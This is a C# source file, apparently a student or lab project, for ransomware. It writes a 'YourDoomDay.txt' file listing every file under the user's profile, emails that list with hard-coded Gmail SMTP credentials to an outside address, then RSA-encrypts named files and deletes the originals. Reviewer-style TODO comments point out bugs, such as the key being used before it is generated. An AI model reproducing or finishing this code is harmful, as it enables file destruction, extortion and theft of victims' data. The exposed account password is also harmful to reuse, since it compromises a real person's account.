using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace FinalSolution
{
    class Program
    {
        private static string publicKey;
        private static string privateKey;
        
        // TODO: put the file in c:\\windows\\Temp (should always exist)
        private static string outputFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\YourDoomDay.txt";
        // TODO: open and close the streamwriter between writes, don't hold it open.
        private static StreamWriter ioFile = new StreamWriter(outputFilePath);

        static void Main(string[] args)
        {
            try
            {
                ioFile.WriteLine("%%%%%%%%%%%%%%%");
                ioFile.WriteLine(privateKey);
                ioFile.WriteLine("%%%%%%%%%%%%%%%");
            }
            catch { // ioFile.WriteLine("Could not write private key"); }

            // Get Sub Files
            foreach (var directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)))
            {
                try
                {
                    // TODO: Are you sure this returns all the files in all the subdirectories, recursively?
                    var filesOfSpecificFolder = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);

                    foreach (var file in filesOfSpecificFolder)
                    {
                        try
                        {
                            // TODO: Encrypt
                            // TODO: dont forget to encrypt, but make sure to first initialize the pair
                            ioFile.WriteLine("FName: " + file);
                            ioFile.WriteLine("FSize: " + new FileInfo(file).Length);
                            ioFile.WriteLine("__________________");
                            //Debug.Print(file);
                        }
                        catch {/* Maybe next time ioFile.WriteLine("Couldnt encrypt file " + file); */}
                    }
                }
                catch { }
            }
            ioFile.Close();
            sendMail();
                
            // You probably need to generate the keys before encrypting
            RSA.GenerateRSAKeyPair(out publicKey, out privateKey);
                
            // I think you want to remove these lines
            encryptFile(@"C:\Users\dor.ben\Desktop\MyAgent.exe");
            encryptFile(@"C:\Users\dor.ben\Desktop\lab_10(1).pdf");
        }

        public static void encryptFile(string filePath)
        {
            string plainFilePath = filePath;
            string encryptedFilePath = MakePath(plainFilePath, ".abc");
            string s = RSA.Encrypt(plainFilePath,
                encryptedFilePath,
                publicKey);
            File.Delete(filePath);
        }

        private static string MakePath(string plainFilePath, string newSuffix)
        {
            string encryptedFileName = Path.GetFileNameWithoutExtension(plainFilePath) + newSuffix;
            return Path.Combine(Path.GetDirectoryName(plainFilePath), encryptedFileName);
        }

        const string email = "johnshitzo@gmail.com";
        const string password = "fp678txe";

        private static void sendMail()
        {
            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(email, password)
            };
            using (var message = new MailMessage(email, "shlomibs10@gmail.com")
            {
                Subject = "Done",
                Body = ":)",
                Attachments = { new Attachment(outputFilePath) }
            })
            {
                smtp.Send(message);
            }
            File.Delete(outputFilePath);
        }
    }
}
